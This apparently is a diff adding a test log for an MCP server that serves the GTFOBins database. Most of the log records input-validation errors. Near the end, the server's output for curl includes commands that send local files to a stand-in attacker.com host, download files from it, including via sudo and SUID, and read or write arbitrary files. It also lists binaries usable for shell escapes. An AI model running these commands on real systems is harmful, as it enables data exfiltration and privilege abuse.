@@ -1,0 +1,270 @@
+===============================================
+TESTING APPLICATION-LEVEL VALIDATION
+===============================================
+
+TESTING: search_gtfobins VALIDATION
+===============================================
+Test Case: search_gtfobins - missing query
+Request: {"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "search_gtfobins", "arguments": {}}, "id": 3}
+===============================================
+{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"gtfobins-server","version":"1.0.0"}}}
+{"jsonrpc":"2.0","id":3,"result":{"content":[{"type":"text","text":"Input validation error: 'query' is a required property"}],"isError":true}}
+
+===============================================
+Test Case: search_gtfobins - empty query
+Request: {"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "search_gtfobins", "arguments": {"query": ""}}, "id": 4}
+===============================================
+{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"gtfobins-server","version":"1.0.0"}}}
+2025-09-03 14:44:56,149 - WARNING - Validation failed: Required parameter query recieved empty string as input
+2025-09-03 14:44:56,150 - ERROR - Tool call failed for 'search_gtfobins' - Invalid parameter: query must be a non-empty string (duration: 0.001s)
+{"jsonrpc":"2.0","id":4,"result":{"content":[{"type":"text","text":"Invalid parameter: query must be a non-empty string"}],"isError":true}}
+
+===============================================
+Test Case: search_gtfobins - non-string query
+Request: {"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "search_gtfobins", "arguments": {"query": 123}}, "id": 5}
+===============================================
+{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"gtfobins-server","version":"1.0.0"}}}
+{"jsonrpc":"2.0","id":5,"result":{"content":[{"type":"text","text":"Input validation error: 123 is not of type 'string'"}],"isError":true}}
+
+===============================================
+Test Case: search_gtfobins - invalid query
+Request: {"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "search_gtfobins", "arguments": {"query": "ellaella"}}, "id": 7}
+===============================================
+{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"gtfobins-server","version":"1.0.0"}}}
+2025-09-03 14:45:02,902 - ERROR - Application-level error in search_gtfobins: Resource not found: Search query 'ellaella' for binary name or technique returned no results
+2025-09-03 14:45:02,902 - ERROR - Tool call failed for 'search_gtfobins' - Resource not found: Search query 'ellaella' for binary name or technique returned no results (duration: 0.001s)
+{"jsonrpc":"2.0","id":7,"result":{"content":[{"type":"text","text":"Resource not found: Search query 'ellaella' for binary name or technique returned no results"}],"isError":true}}
+
+===============================================
+Test Case: search_gtfobins - invalid function_type
+Request: {"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "search_gtfobins", "arguments": {"query": "bash", "function_type": "invalid_function"}}, "id": 6}
+===============================================
+{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"gtfobins-server","version":"1.0.0"}}}
+{"jsonrpc":"2.0","id":6,"result":{"content":[{"type":"text","text":"Input validation error: 'invalid_function' is not one of ['shell', 'file-upload', 'file-download', 'file-write', 'file-read', 'library-load', 'suid', 'sudo', 'capabilities']"}],"isError":true}}
+
+===============================================
+Test Case: search_gtfobins - non-string function_type
+Request: {"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "search_gtfobins", "arguments": {"query": "bash", "function_type": 123}}, "id": 7}
+===============================================
+{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"gtfobins-server","version":"1.0.0"}}}
+{"jsonrpc":"2.0","id":7,"result":{"content":[{"type":"text","text":"Input validation error: 123 is not of type 'string'"}],"isError":true}}
+
+TESTING COMPLETE: search_gtfobins VALIDATION
+===============================================
+
+TESTING: get_binary_details VALIDATION
+===============================================
+Test Case: get_binary_details - missing binary
+Request: {"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "get_binary_details", "arguments": {}}, "id": 8}
+===============================================
+{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"gtfobins-server","version":"1.0.0"}}}
+{"jsonrpc":"2.0","id":8,"result":{"content":[{"type":"text","text":"Input validation error: 'binary' is a required property"}],"isError":true}}
+
+===============================================
+Test Case: get_binary_details - empty binary
+Request: {"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "get_binary_details", "arguments": {"binary": ""}}, "id": 9}
+===============================================
+2025-09-03 14:45:16,808 - WARNING - Validation failed: Required parameter binary recieved empty string as input
+2025-09-03 14:45:16,809 - ERROR - Tool call failed for 'get_binary_details' - Invalid parameter: binary must be a non-empty string (duration: 0.000s)
+{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"gtfobins-server","version":"1.0.0"}}}
+{"jsonrpc":"2.0","id":9,"result":{"content":[{"type":"text","text":"Invalid parameter: binary must be a non-empty string"}],"isError":true}}
+
+===============================================
+Test Case: get_binary_details - whitespace only binary
+Request: {"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "get_binary_details", "arguments": {"binary": "   "}}, "id": 10}
+===============================================
+2025-09-03 14:45:20,257 - WARNING - Validation failed: Required parameter binary recieved empty string as input
+2025-09-03 14:45:20,257 - ERROR - Tool call failed for 'get_binary_details' - Invalid parameter: binary must be a non-empty string (duration: 0.000s)
+{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"gtfobins-server","version":"1.0.0"}}}
+{"jsonrpc":"2.0","id":10,"result":{"content":[{"type":"text","text":"Invalid parameter: binary must be a non-empty string"}],"isError":true}}
+
+===============================================
+Test Case: get_binary_details - non-string binary
+Request: {"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "get_binary_details", "arguments": {"binary": 123}}, "id": 11}
+===============================================
+{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"gtfobins-server","version":"1.0.0"}}}
+{"jsonrpc":"2.0","id":11,"result":{"content":[{"type":"text","text":"Input validation error: 123 is not of type 'string'"}],"isError":true}}
+
+===============================================
+Test Case: get_binary_details - non-existent binary
+Request: {"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "get_binary_details", "arguments": {"binary": "nonexistent_binary_xyz"}}, "id": 12}
+===============================================
+{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"gtfobins-server","version":"1.0.0"}}}
+2025-09-03 14:45:27,336 - ERROR - Application-level error in get_binary_details: Resource not found: Binary 'nonexistent_binary_xyz' not found in GTFOBins database
+2025-09-03 14:45:27,337 - ERROR - Tool call failed for 'get_binary_details' - Resource not found: Binary 'nonexistent_binary_xyz' not found in GTFOBins database (duration: 0.001s)
+{"jsonrpc":"2.0","id":12,"result":{"content":[{"type":"text","text":"Resource not found: Binary 'nonexistent_binary_xyz' not found in GTFOBins database"}],"isError":true}}
+
+TESTING COMPLETE: get_binary_details VALIDATION
+===============================================
+
+TESTING: list_binaries_by_function VALIDATION
+===============================================
+Test Case: list_binaries_by_function - missing function
+Request: {"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "list_binaries_by_function", "arguments": {}}, "id": 13}
+===============================================
+{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"gtfobins-server","version":"1.0.0"}}}
+{"jsonrpc":"2.0","id":13,"result":{"content":[{"type":"text","text":"Input validation error: 'function' is a required property"}],"isError":true}}
+
+===============================================
+Test Case: list_binaries_by_function - empty function
+Request: {"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "list_binaries_by_function", "arguments": {"function": ""}}, "id": 14}
+===============================================
+{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"gtfobins-server","version":"1.0.0"}}}
+{"jsonrpc":"2.0","id":14,"result":{"content":[{"type":"text","text":"Input validation error: '' is not one of ['shell', 'file-upload', 'file-download', 'file-write', 'file-read', 'library-load', 'suid', 'sudo', 'capabilities']"}],"isError":true}}
+
+===============================================
+Test Case: list_binaries_by_function - invalid function
+Request: {"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "list_binaries_by_function", "arguments": {"function": "invalid_function_type"}}, "id": 15}
+===============================================
+{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"gtfobins-server","version":"1.0.0"}}}
+{"jsonrpc":"2.0","id":15,"result":{"content":[{"type":"text","text":"Input validation error: 'invalid_function_type' is not one of ['shell', 'file-upload', 'file-download', 'file-write', 'file-read', 'library-load', 'suid', 'sudo', 'capabilities']"}],"isError":true}}
+
+===============================================
+Test Case: list_binaries_by_function - non-string function
+Request: {"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "list_binaries_by_function", "arguments": {"function": 123}}, "id": 16}
+===============================================
+{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"gtfobins-server","version":"1.0.0"}}}
+{"jsonrpc":"2.0","id":16,"result":{"content":[{"type":"text","text":"Input validation error: 123 is not of type 'string'"}],"isError":true}}
+
+TESTING COMPLETE: list_binaries_by_function VALIDATION
+===============================================
+
+TESTING: GENERAL TOOL VALIDATION
+===============================================
+Test Case: unknown tool
+Request: {"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "nonexistent_tool", "arguments": {}}, "id": 17}
+===============================================
+2025-09-03 14:45:44,625 - ERROR - Unknown tool: nonexistent_tool
+2025-09-03 14:45:44,626 - ERROR - Tool call failed for 'nonexistent_tool' - Method not found: Unknown tool: nonexistent_tool (duration: 0.000s)
+{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"gtfobins-server","version":"1.0.0"}}}
+{"jsonrpc":"2.0","id":17,"result":{"content":[{"type":"text","text":"Method not found: Unknown tool: nonexistent_tool"}],"isError":true}}
+
+===============================================
+Test Case: empty tool name
+Request: {"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "", "arguments": {}}, "id": 18}
+===============================================
+{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"gtfobins-server","version":"1.0.0"}}}
+2025-09-03 14:45:48,088 - WARNING - Validation failed: Tool name is empty
+2025-09-03 14:45:48,088 - ERROR - Tool call failed for '' - Invalid parameters: Tool name must be a non-empty string (duration: 0.000s)
+{"jsonrpc":"2.0","id":18,"result":{"content":[{"type":"text","text":"Invalid parameters: Tool name must be a non-empty string"}],"isError":true}}
+
+===============================================
+Test Case: whitespace tool name
+Request: {"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "   ", "arguments": {}}, "id": 18}
+===============================================
+{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"gtfobins-server","version":"1.0.0"}}}
+2025-09-03 14:45:51,534 - WARNING - Validation failed: Tool name is empty
+2025-09-03 14:45:51,534 - ERROR - Tool call failed for '   ' - Invalid parameters: Tool name must be a non-empty string (duration: 0.000s)
+{"jsonrpc":"2.0","id":18,"result":{"content":[{"type":"text","text":"Invalid parameters: Tool name must be a non-empty string"}],"isError":true}}
+
+===============================================
+Test Case: non-string tool name
+Request: {"jsonrpc": "2.0", "method": "tools/call", "params": {"name": 123, "arguments": {}}, "id": 19}
+===============================================
+{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"gtfobins-server","version":"1.0.0"}}}
+{"jsonrpc":"2.0","id":19,"error":{"code":-32602,"message":"Invalid request parameters","data":""}}
+
+===============================================
+Test Case: non-object arguments
+Request: {"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "search_gtfobins", "arguments": "not an object"}, "id": 20}
+===============================================
+{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"gtfobins-server","version":"1.0.0"}}}
+{"jsonrpc":"2.0","id":20,"error":{"code":-32602,"message":"Invalid request parameters","data":""}}
+
+TESTING COMPLETE: GENERAL TOOL VALIDATION
+===============================================
+
+TESTING: RESOURCE VALIDATION
+===============================================
+Test Case: empty URI
+Request: {"jsonrpc": "2.0", "method": "resources/read", "params": {"uri": ""}, "id": 21}
+===============================================
+{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"gtfobins-server","version":"1.0.0"}}}
+{"jsonrpc":"2.0","id":21,"error":{"code":-32602,"message":"Invalid request parameters","data":""}}
+
+===============================================
+Test Case: invalid URI
+Request: {"jsonrpc": "2.0", "method": "resources/read", "params": {"uri": "file://ella"}, "id": 21}
+===============================================
+{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"gtfobins-server","version":"1.0.0"}}}
+2025-09-03 14:46:05,481 - WARNING - Invalid URI scheme: file://ella/
+{"jsonrpc":"2.0","id":21,"error":{"code":-32602,"message":"Invalid parameters: Unsupported URI scheme: file://ella/"}}
+
+===============================================
+Test Case: empty binary
+Request: {"jsonrpc": "2.0", "method": "resources/read", "params": {"uri": "gtfobins://"}, "id": 22}
+===============================================
+{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"gtfobins-server","version":"1.0.0"}}}
+2025-09-03 14:46:08,967 - WARNING - Empty binary name in URI
+{"jsonrpc":"2.0","id":22,"error":{"code":-32602,"message":"Invalid parameters: Binary name cannot be empty"}}
+
+===============================================
+Test Case: whitespace binary
+Request: {"jsonrpc": "2.0", "method": "resources/read", "params": {"uri": "gtfobins://   "}, "id": 22}
+===============================================
+{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"gtfobins-server","version":"1.0.0"}}}
+2025-09-03 14:46:12,614 - WARNING - Empty binary name in URI
+{"jsonrpc":"2.0","id":22,"error":{"code":-32602,"message":"Invalid parameters: Binary name cannot be empty"}}
+
+===============================================
+Test Case: non-existant binary
+Request: {"jsonrpc": "2.0", "method": "resources/read", "params": {"uri": "gtfobins://i_dont_exist"}, "id": 22}
+===============================================
+{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"gtfobins-server","version":"1.0.0"}}}
+2025-09-03 14:46:15,912 - WARNING - Binary not found: i_dont_exist
+{"jsonrpc":"2.0","id":22,"error":{"code":-32001,"message":"Resource not found in GTFOBins: Binary i_dont_exist"}}
+
+TESTING COMPLETE: RESOURCE VALIDATION
+===============================================
+
+TESTING: VALID REQUESTS (SHOULD WORK)
+===============================================
+Test Case: Valid tools/list
+Request: {"jsonrpc": "2.0", "method": "tools/list", "id": 21}
+===============================================
+{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"gtfobins-server","version":"1.0.0"}}}
+{"jsonrpc":"2.0","id":21,"result":{"tools":[{"name":"search_gtfobins","description":"Search GTFOBins database for binaries and techniques","inputSchema":{"type":"object","properties":{"query":{"type":"string","description":"Search query for binary name or technique"},"function_type":{"type":"string","description":"Filter by function type (shell, file-upload, file-download, etc.)","enum":["shell","file-upload","file-download","file-write","file-read","library-load","suid","sudo","capabilities"]}},"required":["query"]}},{"name":"get_binary_details","description":"Get detailed information about a specific binary","inputSchema":{"type":"object","properties":{"binary":{"type":"string","description":"Name of the binary to get details for"}},"required":["binary"]}},{"name":"list_binaries_by_function","description":"List all binaries that support a specific function","inputSchema":{"type":"object","properties":{"function":{"type":"string","description":"Function type to search for","enum":["shell","file-upload","file-download","file-write","file-read","library-load","suid","sudo","capabilities"]}},"required":["function"]}},{"name":"get_server_status","description":"Get server status and performance metrics","inputSchema":{"type":"object","properties":{},"required":[]}}]}}
+
+===============================================
+Test Case: Valid search_gtfobins
+Request: {"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "search_gtfobins", "arguments": {"query": "curl"}}, "id": 23}
+===============================================
+{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"gtfobins-server","version":"1.0.0"}}}
+{"jsonrpc":"2.0","id":23,"result":{"content":[{"type":"text","text":"Found 1 matches for 'curl':\n\n**curl**\n- Match: Binary name matches 'curl'\n- Functions: file-upload, file-download, file-read, file-write, suid, sudo\n\n"}],"isError":false}}
+
+===============================================
+Test Case: Valid search_gtfobins with function_type
+Request: {"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "search_gtfobins", "arguments": {"query": "curl", "function_type": "sudo"}}, "id": 24}
+===============================================
+{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"gtfobins-server","version":"1.0.0"}}}
+{"jsonrpc":"2.0","id":24,"result":{"content":[{"type":"text","text":"Found 1 matches for 'curl' with function 'sudo':\n\n**curl**\n- Match: Binary name matches 'curl'\n- Functions: file-upload, file-download, file-read, file-write, suid, sudo\n\n"}],"isError":false}}
+
+===============================================
+Test Case: Valid get_binary_details
+Request: {"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "get_binary_details", "arguments": {"binary": "curl"}}, "id": 25}
+===============================================
+{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"gtfobins-server","version":"1.0.0"}}}
+{"jsonrpc":"2.0","id":25,"result":{"content":[{"type":"text","text":"# curl\n\n## Available Functions\n### File-Upload\n```bash\nURL=http://attacker.com/\nLFILE=file_to_send\ncurl -X POST -d \"@$LFILE\" $URL\n\n```\n*Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Omit the `@` to send hard-coded data.*\n\n### File-Download\n```bash\nURL=http://attacker.com/file_to_get\nLFILE=file_to_save\ncurl $URL -o $LFILE\n\n```\n*Fetch a remote file via HTTP GET request.*\n\n### File-Read\n```bash\nLFILE=/tmp/file_to_read\ncurl file://$LFILE\n\n```\n*The file path must be absolute.*\n\n### File-Write\n```bash\nLFILE=file_to_write\nTF=$(mktemp)\necho DATA >$TF\ncurl \"file://$TF\" -o \"$LFILE\"\n\n```\n*The file path must be absolute.*\n\n### Suid\n```bash\nURL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE\n\n```\n*Fetch a remote file via HTTP GET request.*\n\n### Sudo\n```bash\nURL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo curl $URL -o $LFILE\n\n```\n*Fetch a remote file via HTTP GET request.*\n\n"}],"isError":false}}
+
+===============================================
+Test Case: Valid list_binaries_by_function
+Request: {"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "list_binaries_by_function", "arguments": {"function": "shell"}}, "id": 26}
+===============================================
+{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"gtfobins-server","version":"1.0.0"}}}
+{"jsonrpc":"2.0","id":26,"result":{"content":[{"type":"text","text":"Binaries supporting 'shell' function (220 found):\n\n- aa-exec\n- ansible-playbook\n- ansible-test\n- aoss\n- apt\n- apt-get\n- ash\n- at\n- awk\n- aws\n- bash\n- batcat\n- bconsole\n- bundle\n- bundler\n- busctl\n- busybox\n- byebug\n- c89\n- c99\n- cabal\n- capsh\n- cdist\n- certbot\n- check_by_ssh\n- choom\n- cobc\n- composer\n- cowsay\n- cowthink\n- cpan\n- cpio\n- cpulimit\n- crash\n- csh\n- csvtool\n- dash\n- dc\n- debugfs\n- distcc\n- dmesg\n- docker\n- dotnet\n- dpkg\n- dstat\n- dvips\n- easy_install\n- eb\n- ed\n- elvish\n- emacs\n- enscript\n- env\n- ex\n- expect\n- facter\n- find\n- fish\n- flock\n- ftp\n- gawk\n- gcc\n- gcloud\n- gdb\n- gem\n- genie\n- ghc\n- ghci\n- gimp\n- ginsh\n- git\n- grc\n- gtester\n- hping3\n- iftop\n- ionice\n- irb\n- ispell\n- jjs\n- joe\n- journalctl\n- jrunscript\n- jtag\n- julia\n- knife\n- ksh\n- latex\n- latexmk\n- ld.so\n- less\n- lftp\n- loginctl\n- logsave\n- ltrace\n- lua\n- lualatex\n- luatex\n- mail\n- make\n- man\n- mawk\n- minicom\n- more\n- msfconsole\n- msgfilter\n- multitime\n- mysql\n- nano\n- nawk\n- ncdu\n- ncftp\n- neofetch\n- nice\n- nmap\n- node\n- nohup\n- npm\n- nroff\n- nsenter\n- octave\n- openvpn\n- pandoc\n- pdb\n- pdflatex\n- pdftex\n- perf\n- perl\n- perlbug\n- pexec\n- pg\n- php\n- pic\n- pico\n- pip\n- posh\n- pry\n- psftp\n- psql\n- puppet\n- pwsh\n- python\n- rake\n- rc\n- rlwrap\n- rpm\n- rpmdb\n- rpmquery\n- rpmverify\n- rsync\n- rtorrent\n- ruby\n- run-mailcap\n- run-parts\n- runscript\n- rview\n- rvim\n- sash\n- scanmem\n- scp\n- screen\n- script\n- scrot\n- sed\n- service\n- setarch\n- setlock\n- sftp\n- sg\n- slsh\n- smbclient\n- socat\n- softlimit\n- split\n- sqlite3\n- sqlmap\n- ssh\n- ssh-agent\n- sshpass\n- start-stop-daemon\n- stdbuf\n- strace\n- tar\n- task\n- taskset\n- tasksh\n- tclsh\n- tdbtool\n- telnet\n- tex\n- time\n- timedatectl\n- timeout\n- tmate\n- tmux\n- top\n- torify\n- torsocks\n- tshark\n- unshare\n- vagrant\n- valgrind\n- vi\n- view\n- vim\n- vimdiff\n- volatility\n- watch\n- wget\n- wish\n- xargs\n- xdg-user-dir\n- xdotool\n- xelatex\n- xetex\n- yarn\n- yash\n- zathura\n- zip\n- zsh\n- zypper\n"}],"isError":false}}
+
+===============================================
+Test Case: Valid get_server_status
+Request: {"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "get_server_status", "arguments": {}}, "id": 27}
+===============================================
+{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{"experimental":{},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"gtfobins-server","version":"1.0.0"}}}
+{"jsonrpc":"2.0","id":27,"result":{"content":[{"type":"text","text":"Server Status:\n- Uptime: 0:00:00.210107\n- Memory: 56.71 MB\n- CPU: 0.0%\n- Requests Handled: 2\n- Errors Encountered (Application-Level): 0\n- Binaries Loaded: 390\n"}],"isError":false}}
+
+TESTING COMPLETE: VALID REQUESTS
+===============================================
+
+
+===============================================
+TESTING COMPLETE
+===============================================
+
